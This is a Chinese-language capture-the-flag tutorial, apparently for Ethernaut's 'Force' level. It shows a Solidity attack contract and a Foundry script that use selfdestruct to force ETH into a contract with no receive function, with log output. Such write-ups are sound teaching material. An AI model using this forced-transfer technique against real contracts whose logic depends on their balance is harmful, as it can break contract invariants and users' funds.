# W7D4 - 强制转账攻击 (Force Transfer Attack)

## 概述

今天讲一下如何强制给一个没有收款函数的合约转钱。

## 目标合约分析

我们先看看这个合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

第七关的合约里只有一只可爱的小猫，很搞笑。

## 问题分析

如果你不知道如何给这种没有收款函数的合约转钱，那么想破脑袋也想不到。

### 常规尝试

1. **直接转账**：首先你肯定想着直接转，那是不可能的，直接转不过去
2. **通过合约转账**：后面你可能会想，我用合约转一下行不行？试了试，好像也是不行
3. 这时候就没办法了，只能看看别人怎么做的

## 解决方案

### 核心原理

其实在我们前几周中讲过一次。

经常攻击别人合约的朋友都知道，当你销毁合约的时候，你可以调用一个函数强制把合约里的钱转到另一个合约。这个是**底层转账**，不受控制的，不可拒绝的。

> **注意**：当然如果你跑一个区块，挖矿账户填这个合约地址也是可以的，但是别那么做，太 sb 了。

### selfdestruct 函数

思路有了，我们看看这个函数：

```solidity
selfdestruct(payable(address));
```

摧毁合约并把钱全部转到 `address` 里面。

## 攻击合约实现

我们写一下这个攻击合约：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";

contract ForceAttack{

    constructor(){
    }
    
    function destory(address force) public{
        selfdestruct(payable(force));
    }
    
    receive() external payable{
    }
}
```

### 代码说明

- 设置一个 `destory` 函数，把小猫的地址传递进去，然后摧毁合约的时候会把所有的钱都转到小猫的地址
- 设置一个 `receive` 函数来接受一点 ETH

## 攻击步骤

### 1. 部署攻击合约

部署这个合约到链上。

### 2. 转入资金

从我们的账户转一点钱过去，少转一点就行，我转了 `0.000001 ETH`。

### 3. 执行攻击脚本

然后我们就可以写强制转账的脚本了：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Force.sol";
import "../src/ForceAttack.sol";

contract ForceScript is Script{

    function run() external{

        uint256 privateKey = vm.envUint("PRIVATE_KEY");

        address ForceAddr = 0x805681786e505731a23D537436f5Cb04845db46D;

        address payable ForceAttackAddr = payable(0xDA71C06B623286eCa79355734A56Ab6ba1fF0271);

        vm.startBroadcast(privateKey);
        
        ForceAttack FA = ForceAttack(ForceAttackAddr);

        FA.destory(payable(ForceAddr));

        console.log("Success",ForceAddr.balance);

        vm.stopBroadcast();
    }
}
```

### 4. 运行脚本

**重要提示**：

1. 记得先 `source .env` 读取环境中的 `privateKey`
2. 把 `address ForceAddr` 和 `address payable ForceAttackAddr` 换成你的实例地址
3. 为什么要写 `payable`？因为不写这个不让转账

运行脚本吧，你会看到输出：

```
== Logs ==
  Success 100000000000
```

这样就成功强制转入资金了！

## 总结

很简单吧，自己弄一下试试吧！
